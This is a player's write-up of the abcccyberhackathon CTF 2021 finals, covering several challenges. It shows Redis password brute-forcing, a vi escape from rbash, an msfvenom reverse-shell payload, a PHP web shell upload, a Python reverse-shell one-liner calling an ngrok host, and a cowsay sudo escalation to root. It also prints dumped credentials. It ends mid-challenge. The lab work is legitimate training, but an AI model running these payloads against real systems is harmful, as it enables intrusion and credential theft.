---
layout: default
title : muzec - abcccyberhackathon CTF 2021 Finals Writeup
---

### Overview Of The CTF

As part of the 2021 Cybersecurity Conference, the American Business Council Nigeria (ABC Nigeria) was Organized by NaijaSecForce in partnership with Private Sector partners are hosting a Cybersecurity Hackathon. The objective of the hackathon is to highlight the capacity in the space and show the importance of implementing a cybersecurity framework in Nigeria.

The Hackathon will award innovators for displaying their level of expertise and skills in developing solutions to cyber challenges. A Cyber Award will be allocated in kind and will be distributed among the top three winners. 

Cyber Awards will be awarded to the top three teams. Prices includes Laptops, Cybersecurity Certificates, Bootcamp for winners on Security in IBM Cloud, Cisco Certified CyberOps Associate Certifications for the Team Captains and Merchandise. The Award is sponsored by Cisco, IBM, Comercio and American Business Council.


### Cybersecurity Hackathon Competition Finals Write Up By RedTeamNG

Damn man am so excited when working on the write up like man all the challenges are pretty cool come on Muzec just get started already lol.

###  WYSIWYG - 700 Point 

![image](https://user-images.githubusercontent.com/69868171/130941058-5408e587-fdf6-42fb-abc4-acfa02684c77.png)


Man I Keep Saying It We Always Start With An Nmap Scan.

```
muz3c@RedTeamNG:/$ nmap -sC -Pn -sV -p- 193.37.212.211 -T4
Starting Nmap 7.70 ( https://nmap.org ) at 2021-08-26 05:51 EDT
Stats: 0:01:39 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 49.69% done; ETC: 05:54 (0:01:41 remaining)
Nmap scan report for 193.37.212.211
Host is up (0.20s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
6379/tcp open  redis   Redis key-value store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 191.35 seconds
```

So we have some interesting ports 22 which is SSH and 6379 ahhh the mighty Redis port but no HTTP or HTTPS i mean port 80 or 443 man don't google that up again lol just kidding man. I think we all know port ssh but before diving deep let look into the redis port.

### What IS Redis


Redis is an in-memory data structure store, used as a distributed, in-memory key–value database, cache and message broker, with optional durability. Redis supports different kinds of abstract data structures, such as strings, lists, maps, sets, sorted sets, HyperLogLogs, bitmaps, streams, and spatial indices. which is always on port 6379 which can always change also probably for security reason man let just hack it feel free to check redis Documentation.

### Redis Manual Enumeration

```
 redis-cli -h  193.37.212.211
 ```
 
 ![image](https://user-images.githubusercontent.com/69868171/130943953-d2b38248-c655-4145-a841-d3f440a5afc4.png)

Seems anonymous logins is not allowed let try brute forcing with hydra.

```
┌──(muzec㉿Muzec-Security)-[~/Desktop/CTFPlayground/ABC/ABCWriteup]
└─$ hydra -P /usr/share/wordlists/rockyou.txt  193.37.212.211  redis         
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-26 08:05:50
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking redis://193.37.212.211:6379/
[6379][redis] host: 193.37.212.211   password: hotdog
[STATUS] 2964.00 tries/min, 2964 tries in 00:01h, 14341435 to do in 80:39h, 16 active
```

Ahhh nice we have the password now let log in redis again with the new credentials.

![image](https://user-images.githubusercontent.com/69868171/130944608-82c019eb-b151-4af1-b8e0-3da5040fadc7.png)

We are in typing `info` give us some more information about the databases and bla bla bla now let dump something using `redis-dump` .

```
redis-dump -u  193.37.212.211  -a hotdog > full.json
```

![image](https://user-images.githubusercontent.com/69868171/130945239-7519d0c7-1a42-466c-a7e8-116f2d28125f.png)

Avoid the `wget bla bla bla` i don't know what the dude is trying to wget again in redis now we have the credentials let just crack the hash.

![image](https://user-images.githubusercontent.com/69868171/130945574-eddcabc4-1e04-462d-b484-dcd01dd69b31.png)

we have credentials for SSH now.

```
lowprivuser
passw0rd123
```

But let go back to the redis and try and read the databases manually.

![image](https://user-images.githubusercontent.com/69868171/130945872-8d5ef1bb-2921-41be-a0f0-a75f18c2e2ef.png)

```
SELECT 0
KEYS *
GET "lowprivuser"
```

![image](https://user-images.githubusercontent.com/69868171/130946749-9b9c1a17-b35d-421d-88b0-ff6e2287c1d7.png)

Now back using SSH.


![image](https://user-images.githubusercontent.com/69868171/130946971-a348c3a1-bb91-4691-9948-1dc2c25345a7.png)

We are in let check the shell we have `echo $SHELL` .

![image](https://user-images.githubusercontent.com/69868171/130947062-0afcd91a-2068-43e0-8bf3-ba68c8c40cb2.png)

Ahhh rbash restricted lol `rudefish` i will get you lol.

![image](https://user-images.githubusercontent.com/69868171/130947229-c003ce4b-c5c4-4ce6-b409-160f11b2cc4e.png)

`sudo -l` but nothing let check how many users we have on the linux system first.

![image](https://user-images.githubusercontent.com/69868171/130947389-36b0d7ab-345f-4258-a4fe-eaf728887363.png)

More users cool let go to the home directory but seems we are still restricted let break out of it.

![image](https://user-images.githubusercontent.com/69868171/130947620-69f8c865-f3b8-4767-8bd9-0d66aca1c626.png)

### Breaking Out With VI

```
vi
:set shell=/bin/sh
:shell 
```

![image](https://user-images.githubusercontent.com/69868171/130947914-44de0188-1df6-4579-8763-4f645a56897b.png)

![image](https://user-images.githubusercontent.com/69868171/130947965-d0b4cc85-ab31-4c98-8648-dc5bf53400fb.png)

We have no access to `abcctf` folder now let find way to move our privilege

![image](https://user-images.githubusercontent.com/69868171/130948113-c9b0974d-38ab-44af-82b6-1c1a077f1a79.png)

We have port 80 running locally and mysql port also dns port now let port forward using SSH.

```
ssh -L 8080:localhost:80 lowprivuser@193.37.212.211
```

![image](https://user-images.githubusercontent.com/69868171/130949150-b78222e4-15d0-4720-8ddb-65fe06ece995.png)

Accessing `localhost:8080`

![image](https://user-images.githubusercontent.com/69868171/130950252-26fc6d72-f2a7-40fb-860b-bb04bf3120b0.png)

But i have no idea why am having problem using the SSH port fowarding let transfer it man i hate using Metasploit.

### Generating Payload With Msfvenom 

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=2.tcp.ngrok.io LPORT=10969 -f elf > shell.elf
```

NOTE:- i will be using ngrok to recieve back connection actually it pretty cool you should try it.

![image](https://user-images.githubusercontent.com/69868171/130972937-40df2fd5-2085-4e5b-b24e-40cf4a1be1db.png)

Seems we have generate our payload and our listener is ready on msfconsole.

![image](https://user-images.githubusercontent.com/69868171/130973228-ef4cad67-b880-483d-9512-835273a7b328.png)

NOTE:- you need to transfer your payload to the target also to execute it.

![image](https://user-images.githubusercontent.com/69868171/130973544-86fbd880-8b75-4dd3-bb07-ca4f1293a1b4.png)

Checking Our listener and boom a Meterpreter session 1 opened.

![image](https://user-images.githubusercontent.com/69868171/130974822-8c1fb403-a723-459a-bac9-a90265672878.png)

```
portfwd add -l 80 -p 80 -r 127.0.0.1
```

Port Forwarding i know you know.

![image](https://user-images.githubusercontent.com/69868171/130978479-ae8c8c25-f79a-4b9b-a652-a33993cef73c.png)

Now accessing the webserver on our localhost.

![image](https://user-images.githubusercontent.com/69868171/130978505-512f52cf-ed44-4ec9-ae9f-e1e0190373f4.png)

Now let try and create account.

![image](https://user-images.githubusercontent.com/69868171/130978665-dbbe5106-a5e5-4a29-9791-7d0b370e7714.png)

We are in.

![image](https://user-images.githubusercontent.com/69868171/130978730-eaabf704-8358-44c6-bb38-a900a1915a2f.png)


Simple Image Gallery System 1.0 a quick google search and we know it vulnerable to SQL injection and RCE but seems we register a user let hit the RCE.

![image](https://user-images.githubusercontent.com/69868171/130989082-9895fcc0-b654-49de-8586-fdbf85519938.png)

So i decided to upload a php command injection code on the profile picture page.

```
┌──(muzec㉿Muzec-Security)-[~/Desktop/CTFPlayground/ABC/ABCWriteup]
└─$ cat shell.php     
<?php system ($_GET['cmd']) ?>
```

![image](https://user-images.githubusercontent.com/69868171/130989389-4e022a96-aa68-452e-ba4f-5e36fd69b1f6.png)

Boom we have command injection now let get a reverse shell.

![image](https://user-images.githubusercontent.com/69868171/130993445-f55af863-e5c6-43f1-b8f6-5045fd3d0aef.png)

Checking our Ncat listener back.

![image](https://user-images.githubusercontent.com/69868171/130993509-35986298-2869-4e89-a2f0-0a42ed060a37.png)

Now let spawn a tty shell.

```
python3 -c 'import pty; pty.spawn ("/bin/bash")'
```

Now let enumerate more on the target using `linpeas.sh` .

![image](https://user-images.githubusercontent.com/69868171/130996588-77e17f72-bc85-469b-a211-5566fd41fc5c.png)

```
/var/www/html/gallery/initialize.php:if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"forthedubs");                                                                   
```

```
/var/www/html/gallery/initialize.php:if(!defined('DB_USERNAME')) define('DB_USERNAME',"www-data");                                                                     
```

Ahhh we have some credential for the database let try it on mysql.

![image](https://user-images.githubusercontent.com/69868171/130998271-8f85d294-9e3b-4520-8095-d414f4e72976.png)

We are in.

![image](https://user-images.githubusercontent.com/69868171/130998467-bb9593af-3592-45d6-afd8-7f88549e5478.png)

```
mysql> SELECT * from users;
SELECT * from users;
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+-------------------
--+---------------------+
| id | firstname    | lastname | username | password                         | avatar                                          | last_login | type | date_added        
  | date_updated        |
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+-------------------
--+---------------------+
|  1 | Adminstrator | Admin    | admin    | 0192023a7bbd73250516f069df18b500 | uploads/1629675420_TagorbnpwmgzgrsorojLetta.php | NULL       |    1 | 2021-01-20 14:02:3
7 | 2021-08-22 23:37:40 |
|  2 | Jane         | Doe      | abcctf   | zburhWD2B7PqTx6sVfVszBE3KhgCqT   | uploads/1624240500_avatar.png                   | NULL       |    1 | 2021-01-20 14:02:3
7 | 2021-06-21 09:55:07 |
| 10 | rat          | rat      | rat      | d285ed4b87f365a2273842b0208a60c8 | NULL                                            | NULL       |    0 | 2021-08-23 20:56:2
0 | NULL                |
| 11 | bots         | bots     | bots     | 2241bbfb8e26f6de627e38a1bbcdc9a9 | uploads/1629752160_webshell.php                 | NULL       |    0 | 2021-08-23 20:56:3
3 | NULL                |
| 12 | ratty        | rattyu   | ratty    | d285ed4b87f365a2273842b0208a60c8 | uploads/1629752220_Capture.PNG                  | NULL       |    0 | 2021-08-23 20:57:4
7 | NULL                |
| 13 | bots         | bots     | bots     | 21f1a6f87b2137da269ccb2e3030889a | uploads/1629752280_webshell.php                 | NULL       |    0 | 2021-08-23 20:58:1
8 | NULL                |
| 14 | bots         | bots     | bots     | 21f1a6f87b2137da269ccb2e3030889a | uploads/1629752280_webshell.php                 | NULL       |    0 | 2021-08-23 20:58:2
5 | NULL                |
| 15 | ratty        | ratty    | ratty    | 289462fcc025ce66f113ac73a13131cf | uploads/1629752400_God.png                      | NULL       |    0 | 2021-08-23 21:00:5
8 | NULL                |
| 16 |              |          | ratty    | d285ed4b87f365a2273842b0208a60c8 | NULL                                            | NULL       |    0 | 2021-08-23 21:06:0
7 | NULL                |
| 17 | Musa         | saminu   | muzec    | bc05d7cbe414aa0f785d54525c2f822d | uploads/1629994260_shell.php                    | NULL       |    0 | 2021-08-26 14:13:3
9 | 2021-08-26 16:11:48 |
| 18 | Musa         | Saminu   | muzec    | bc05d7cbe414aa0f785d54525c2f822d | uploads/1629987780_muzec.png                    | NULL       |    0 | 2021-08-26 14:23:1
0 | NULL                |
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+-------------------
```

I was able to dump some users credentials but the one that i found interesting is;

```
|  2 | Jane         | Doe      | abcctf   | zburhWD2B7PqTx6sVfVszBE3KhgCqT   | uploads/1624240500_avatar.png                   | NULL       |    1 | 2021-01-20 14:02:3 
```

We have abcctf running on the system also let try it using `su abcctf` with the password .

![image](https://user-images.githubusercontent.com/69868171/130999074-2d575a58-ca00-4037-a7de-0279921141fe.png)

We are in hahhahahaha and also we can run sudo.

![image](https://user-images.githubusercontent.com/69868171/130999177-8ee78ed2-d9e0-4391-965e-5432a5ad99a4.png)

We have the first part of the flag now let root it.

### ROOT

![image](https://user-images.githubusercontent.com/69868171/131000717-969b0859-b681-4f3d-9b2a-fb4830a5f28c.png)

```
abcctf@vps:~$ sudo -l
Matching Defaults entries for abcctf on vps:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User abcctf may run the following commands on vps:
    (root) /usr/games/cowsay
abcctf@vps:~$ TF=$(mktemp)
abcctf@vps:~$ echo 'exec "/bin/sh";' >$TF
abcctf@vps:~$ sudo /usr/games/cowsay -f $TF x
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
final_part.txt  snap
# cat final_part.txt
Congratulations, you made it to the end. Herer is the remaining part of your flag.

0r_4re_clos3r_than_they_app34r}
# echo "Muzec is Here" > .root.txt
# 
```

We are done fun right?? hahahahaha

Final Flag:- `abcctf{0bjects_!n_the_Mirr0r_4re_clos3r_than_they_app34r}`


###  Mr Obiora, the BEC victim  - 500 point

![image](https://user-images.githubusercontent.com/69868171/131153736-55d32a78-98fd-46ef-ade0-79c5eb9ac4fc.png)

Mr. Obiora Nurudeen - despite having attended multiple security awareness sessions - still loves to open unknown attachments regardless of the format. Try to get Mr. Obiora to run your malicious payload so you can access his PC. His email is obiora_nurudeen@ctf.ng.

What is his IP address?

Man it was way cool i actually solve it the unintended way cool right i know i love breaking things unintended way since we have the mail why not try sending a mail maybe will get a reply back. 

```
SPAMMING
Muzec Saminu <redacted@gmail.com>
	
Aug 24, 2021, 4:34 AM (3 days ago)
	
to obiora_nurudeen
checking
```

I waited an hour before getting back  a reply which is job well done lol.

![image](https://user-images.githubusercontent.com/69868171/131154563-369c7890-68c3-4e82-b7ec-cdd83610adf8.png)


Now let try getting the IP address.

![image](https://user-images.githubusercontent.com/69868171/131154974-8e6eac69-992d-4e1b-8c52-6c0f1f723e01.png)

```
Show original
```

![image](https://user-images.githubusercontent.com/69868171/131155299-7db69c76-4232-4cbb-bdaa-45e9db34bb72.png)

Going through it and i was able to get Mr. Obiora IP address `185.177.59.120`

Final Flag:- `abcctf{185.177.59.120}`


### Easy Peasy - 100 point

![image](https://user-images.githubusercontent.com/69868171/131155842-bcce1882-7865-408b-91e0-c6709275891a.png)

Easy peasy to simple just like the name stated we have the URL to attack already let hit it.


![image](https://user-images.githubusercontent.com/69868171/131155966-3f111850-09b4-451c-8a88-39b0450937da.png)

A simple login page also a button to register which seems to be not working hahahaha let try some default credentials on the login page like `admin/admin` not luck `admin/password` but man i got nothing let try checking the source code.

![image](https://user-images.githubusercontent.com/69868171/131156243-1711ffa9-b5b9-4255-a989-d425e3825ea4.png)

Got nothing also let try to burst some directory with gobuster.

```
┌──(muzec㉿Muzec-Security)-[~/Desktop/CTFPlayground/ABC/ABCWriteup]
└─$ gobuster dir -u http://185.203.119.50:4200/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,html,bak,sh,pl,cgi,zip
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://185.203.119.50:4200/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              sh,pl,cgi,zip,txt,php,html,bak
[+] Timeout:                 10s
===============================================================
2021/08/27 14:05:07 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 5277]
/dev                  (Status: 301) [Size: 321] [--> http://185.203.119.50:4200/dev/]
```

Some interesting develompent page let check it out.

![image](https://user-images.githubusercontent.com/69868171/131156819-e31a0103-c8c2-45e4-979d-5641d17b57e4.png)

Let hit the source code again.

![image](https://user-images.githubusercontent.com/69868171/131156877-af97832c-6155-431e-83b0-20ba85673dce.png)

Cool a hint let trying going down more.

![image](https://user-images.githubusercontent.com/69868171/131156987-d0d068e9-20f7-4426-a824-5f69aa676583.png)

Another hint i think let try decoding it using terminal.

![image](https://user-images.githubusercontent.com/69868171/131157071-7ac96efe-1bf9-4cac-8445-a94495ef311b.png)

We are down to `<!-- var _0x26a3=["\x4A\x61\x56\x61\x53\x63\x52\x69\x50\x74\x5F\x69\x53\x5F\x66\x55\x6E"];console.PassCode(_0x26a3[0]) -->`

Seems like hex to me let try using cyberchef.

![image](https://user-images.githubusercontent.com/69868171/131157201-0ffe8f72-5e90-4e61-afba-67af58bb192f.png)


```
JaVaScRiPt_iS_fUn
```

A flag nah i try it but no luck maybe it a password let dig more.

```
By the way, we have created a nice login page in PHP. Go find it out
```

Seems we know we are in the development page let burst the endpoint.

```
┌──(muzec㉿Muzec-Security)-[~/Desktop/CTFPlayground/ABC/ABCWriteup]
└─$ gobuster dir -u http://185.203.119.50:4200/dev -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,html,bak,sh,pl,cgi,zip
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://185.203.119.50:4200/dev
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              bak,sh,pl,cgi,zip,txt,php,html
[+] Timeout:                 10s
===============================================================
2021/08/27 14:14:02 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 526]
/login.php            (Status: 200) [Size: 1654]
```

Boom i feel like a l33t hacker now lol we have the login page let try the password on it.

![image](https://user-images.githubusercontent.com/69868171/131157676-c98b870b-4c3c-4da1-929a-68d06e4b9f77.png)


Password:- `JaVaScRiPt_iS_fUn` not to sure but let try it.


![image](https://user-images.githubusercontent.com/69868171/131157816-fb811cdf-ef02-4c04-82bb-b9e7bca8ef09.png)

Ahhh it password but seems we need to try harder to get the flag lol let check the source page again.

![image](https://user-images.githubusercontent.com/69868171/131157942-83d69727-1a93-48f3-895e-9823cdb534e4.png)

But it a dead end maybe the image can help let wget it to our machine.

![image](https://user-images.githubusercontent.com/69868171/131158071-fbc7cd00-4f5e-4e14-b270-fdacd3fc74ea.png)

We have it now let check some metadata bla bla bla using `exiftool` .

![image](https://user-images.githubusercontent.com/69868171/131158187-906e334b-503d-49b1-a125-f710671651d7.png)

Boom we got the flag page `/ThE_FlAg_PaGe.html` let hit it.

![image](https://user-images.githubusercontent.com/69868171/131158286-57814382-1af4-46c8-8914-2c6189f41334.png)

You made it champ, Here is your reward, the flag! and we got the flag.


Final Flag:- `abcctf{H4cKiNG_i$_FuN_K33P_L34RN1NG}`


### Secret Keepers - The Beginning - 150 point


![image](https://user-images.githubusercontent.com/69868171/131158614-8f2a9e97-1c3f-4d99-b1e2-1827d2847e32.png)


Let go of the burden, tell us your secrets we have the URL to pwned pwned sorry i mean attack let hit it.

![image](https://user-images.githubusercontent.com/69868171/131158836-60d10902-c6c4-4f16-a9f6-3e267c398935.png)


Nice let look around we have some page let check the contact us page.

![image](https://user-images.githubusercontent.com/69868171/131165036-c30261f9-22f6-49a9-bda3-a46c6807bba8.png)

Sweet a flag page let check it out maybe it way simple lol.

![image](https://user-images.githubusercontent.com/69868171/131165289-0aa0b918-3d34-4162-bbcb-d702f629671d.png)

We have a half flag damn `Your flag is abcctf{l3t_`  not that simple i guess back to the contact form.

![image](https://user-images.githubusercontent.com/69868171/131165592-9314a1fa-5a44-44a7-88b9-fa794ea6d27a.png)

A little hint;-

```
Ermm, send to rudefish, he might have something for you
```

We should have a cooke present let check it with cookie editor.


![image](https://user-images.githubusercontent.com/69868171/131165901-b6962092-8b2e-4757-9b3a-925bdb9ea7fa.png)

Nice sending to web-admin let intercept the request with burp and edit the cookie to `rudefish` .

![image](https://user-images.githubusercontent.com/69868171/131166367-41e2df0b-d1b2-4b2a-950e-65ac0775652b.png)

Edit request below like the image.

![image](https://user-images.githubusercontent.com/69868171/131166990-90750860-f9ab-47f3-80f2-91003c1b6f37.png)


```
Cookie: sendTo=rudefish
```
Now send let check our mail we should receive a mail from rudefish if it right.

![image](https://user-images.githubusercontent.com/69868171/131167151-0ec8c4d2-9b53-4d79-9464-6c2e93929f9a.png)

Boom we have the complete flag now.


Final Flag:- `abcctf{l3t_h4v3_your_secr375!}`


### Secret Keepers - Intermediate  - 150 point

![image](https://user-images.githubusercontent.com/69868171/131167791-8890785a-0bba-4c05-9894-ddc7b8ecd857.png)

Now back to the rudefish mail.

```
One of my challenges is differentiating robots from humans. But since you are here, a human, I will let you in on a little secret.

                              User-Agent: *
                              Disallow: /115 101 99 114 101 116 45 99 111 110 116 114 111 108 45 99 101 110 116 101 114
                          

Does that make sense? I hope so. See you at the other side.
```

Looking like deciaml code.

![image](https://user-images.githubusercontent.com/69868171/131169096-111fb92e-a891-4ef1-8133-f7f2442fbf36.png)

Nice am right we have a secret page cool `secret-control-center` let access it.

![image](https://user-images.githubusercontent.com/69868171/131169281-bf6b33bb-57c1-4c89-9ff4-7a4c3feacc2f.png)


Admin Control Center cool we have the mail already `rudefish@secretkeepers.abc` but we are missing a password hahahaha nice brute forcing i guess let try creating a wordlist with `cewl` with the url.

```
┌──(muzec㉿Muzec-Security)-[~/Desktop/CTFPlayground/ABC/ABCWriteup]
└─$ cewl http://185.203.119.50:6500/home > abc.txt
  
```

But man it was generating rubbish so let try to extract the words solo.

![image](https://user-images.githubusercontent.com/69868171/131172998-93560a59-bef3-4a8c-8e21-2e7dc350ca9e.png)


```
Never
seek
to
tell
thy
love
Love
that
never
told
can
be
For
the
gentle
wind
does
move
Silently
invisibly
I
told
my
love
I
told
mylove
I
told
her
all
my
heart
Trembling
cold
in
ghastly
fears
Ah
she
doth
depart
Soon
as
she
was
gone
from
me
A
traveller
whistleblower
came
by
Silently
invisibly
O
was
no
deny
https
com
www
creative
tim
paper
kit
notice
and
Paper
Kit
Angular
Product
Page
product
angular
Copyright
Creative
Tim
Licensed
under
MIT
github
timcreative
blob
master
LICENSE
The
above
copyright
this
permission
shall
included
all
copies
substantial
portions
the
Software
Secret
Keepers
Fonts
icons
```

Save in a txt file now let intercept the login form and brute force the hell out of it.

![image](https://user-images.githubusercontent.com/69868171/131173251-014947df-49ac-44c9-a7ca-1be5ef74bcdd.png)


Intercept with Burp.

![image](https://user-images.githubusercontent.com/69868171/131173353-c48bc885-b93b-46a5-a662-bd063ed33427.png)

Send to Intruder.

![image](https://user-images.githubusercontent.com/69868171/131173417-fbaf0458-ad63-46e4-ba01-44dd26575cf6.png)

Now click on clear we only the password form to bruteforce.

![image](https://user-images.githubusercontent.com/69868171/131173503-1b5c134f-9050-440e-86a7-f33ea268014c.png)

Now let add it.

![image](https://user-images.githubusercontent.com/69868171/131173575-db187960-14c9-4de7-911d-fce3b51a8d47.png)

Now let click on the payloads.

![image](https://user-images.githubusercontent.com/69868171/131173730-7733a72a-d4ff-48ed-95b9-2ccad2002f3d.png)

Click on payloads options and load the wordlist after that let click on start attack.

![image](https://user-images.githubusercontent.com/69868171/131173838-52709893-aa69-4e7b-8fcf-4d9b8cd77c17.png)

When we have the right password the status and the length would be different.

![image](https://user-images.githubusercontent.com/69868171/131174543-993b044f-6d3a-415a-88f0-d8da8ec1e631.png)

We are in the password is `whistleblower` now let log in.

![image](https://user-images.githubusercontent.com/69868171/131174696-769194d4-d017-4a9a-9a7a-9278d98bbd77.png)

We are in man we are in awesome right let get the flag.

![image](https://user-images.githubusercontent.com/69868171/131177285-1e79136e-61d5-4c1d-8f05-be76ac439a28.png)


Final Flag:- `abcctf{g00d_t0_se3_you_here_hum4n}`

###  Secret Keepers - The End  - 100 point

![image](https://user-images.githubusercontent.com/69868171/131177404-c71553ad-6a55-434b-93ba-a3bcc622c767.png)

Seems we can execute some command let get a reverse shell.

![image](https://user-images.githubusercontent.com/69868171/131174828-73cf9651-543b-4a2d-ae4f-d2c023e0674f.png)

Now let get a reverse shell using ngrok.

![image](https://user-images.githubusercontent.com/69868171/131175159-b2c59772-0c13-4bc0-b58f-11be12507764.png)

Ncat listener ready.

![image](https://user-images.githubusercontent.com/69868171/131175720-ffe5cc63-2b0c-475c-9b56-7b0e1c1392c5.png)

Reverse shell payload ready.

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("2.tcp.ngrok.io",19733));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![image](https://user-images.githubusercontent.com/69868171/131176054-c5937f39-a476-4c4a-9816-49424b0c766c.png)

Checking our Ncat listener and we have shell.

![image](https://user-images.githubusercontent.com/69868171/131176308-3bb2397a-1fa7-4f7e-bbd4-84e5e90fb2d5.png)

Now hunting for the last flag i check the root folder i got nothing.

![image](https://user-images.githubusercontent.com/69868171/131177583-45824d3a-c5d5-4ad5-a97d-464baf1c5d68.png)

But seems we have a hidden git folder running let check it out.

![image](https://user-images.githubusercontent.com/69868171/131177753-f11471b6-6c72-4fb7-8618-1fb329288b7d.png)

Going through some commit and we have some leads and we have the last flag hahahaaha fun right?? 

![image](https://user-images.githubusercontent.com/69868171/131177870-4e7407e6-3f42-4b93-bcda-f6101a874ac9.png)


Final Flag:- `abcctf{remember_YoUr_s3cret_!s_safe_with_us}`

All clear man i have fun let hit it.

###  Pinky and The mouse - 100 point 

![image](https://user-images.githubusercontent.com/69868171/131212342-9e0e221e-5746-4991-897e-1f661c1f3a19.png)

Let download the head.txt file.

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>---.+.+..+++++++++++++++++.--------------.+++++++++++++++++++++.<+++++++++++++.>------------------.++++.+++.----.<++++++.++++++.-----------------------------.>++++++.<--.>---------.+++++.---------------------.++++++++++++++++++++++++++++++++++++.
```

Definitely a Brainf*ck Code let hit it.

![image](https://user-images.githubusercontent.com/69868171/131212431-f490f295-9657-42b8-b706-b9b548e61d37.png)

Final Flag:- `abcctf{SimplY_Br@inY}`

###  Gentle Reminder  - 250 point 

![image](https://user-images.githubusercontent.com/69868171/131212522-d8de2d66-8648-4ab5-a19f-f477446f8140.png)

Never put sensitive things in your purse man let just download it.

```
011^0000^1011^011^00^0100^0100^1011^111^001^1000^0^0100^111^111^101^00^10^110^0010^111^010^011^0000^01^1^00^000^10^111^1^11^00^000^000^00^10^110^0^11^111^000^00011^011^01^1011^0100^0110^11^00^000^0^000^010^11111^11^0010^1^1010^1010^1000^01^01^11^111^10^110^11^00^000^000^00^10^110^1^0000^00^10^110^000^111^010^100^111^1011^111^001^10^111^1^101^10^111^011^1^0000^01^1^00^1^011^00^0100^0100^0100^0^01^100^1^111^1011^111^001^0100^111^111^101^00^10^110^1^111^111^100^0^0^0110^0100^1011^01^10^100^011^00^100^0^0100^1011^0010^111^010^011^0000^01^1^000^0000^111^001^0100^100^10^111^1^1000^0^000^111^001^110^0000^1^0010^111^010^00^10^1^0000^0^0100^01^10^100^111^0010^1^0000^0^110^01^11^0
```

I will call it a fu#king broken binary when not let fix it.

```
┌──(muzec㉿Muzec-Security)-[~/Desktop/CTFPlayground/ABC/ABCWriteup]
└─$ cat  binary.txt  | tr  '^'  ' '
011 0000 1011 011 00 0100 0100 1011 111 001 1000 0 0100 111 111 101 00 10 110 0010 111 010 011 0000 01 1 00 000 10 111 1 11 00 000 000 00 10 110 0 11 111 000 00011 011 01 1011 0100 0110 11 00 000 0 000 010 11111 11 0010 1 1010 1010 1000 01 01 11 111 10 110 11 00 000 000 00 10 110 1 0000 00 10 110 000 111 010 100 111 1011 111 001 10 111 1 101 10 111 011 1 0000 01 1 00 1 011 00 0100 0100 0100 0 01 100 1 111 1011 111 001 0100 111 111 101 00 10 110 1 111 111 100 0 0 0110 0100 1011 01 10 100 011 00 100 0 0100 1011 0010 111 010 011 0000 01 1 000 0000 111 001 0100 100 10 111 1 1000 0 000 111 001 110 0000 1 0010 111 010 00 10 1 0000 0 0100 01 10 100 111 0010 1 0000 0 110 01 11 0
```

Cutting out `^` and also adding some space.

```

from __future__ import print_function
a = input("input the string:")
s = a.split(" ")
dict = {'01': 'A',
        '1000': 'B',
        '1010': 'C',
        '100':'D',
        '0':'E',
        '0010':'F',
        '110': 'G',
        '0000': 'H',
        '00': 'I',
        '0111':'J',
        '101': 'K',
        '0100': 'L',
        '11': 'M',
        '10': 'N',
        '111': 'O',
        '0110': 'P',
        '1101': 'Q',
        '010': 'R',
        '000': 'S',
        '1': 'T',
        '001': 'U',
        '0001': 'V',
        '011': 'W',
        '1001': 'X',
        '1011': 'Y',
        '1100': 'Z',
        '01111': '1',
        '00111': '2',
        '00011': '3',
        '00001': '4',
        '00000': '5',
        '10000': '6',
        '11000': '7',
        '11100': '8',
        '11110': '9',
        '11111': '0',
        '001100': '?',
        '10010': '/',
        '101101': '()',
        '100001': '-',
        '010101': '.',
        '110011':',',
        '011010':'@',
        '111000':':',
        '101010':':',
        '10001':'=',
        '011110':"'",
        '101011':'!',
        '001101':'_',
        '010010':'"',
        '10110':'(',
        '1111011':'{',
        '1111101':'}'
        };
for item in s:
    print (dict[item],end='')
```

Some really cool script to decode it.

```
┌──(muzec㉿Muzec-Security)-[~/Desktop/CTFPlayground/ABC/ABCWriteup]
└─$ python3 crypto.py                                                                                      
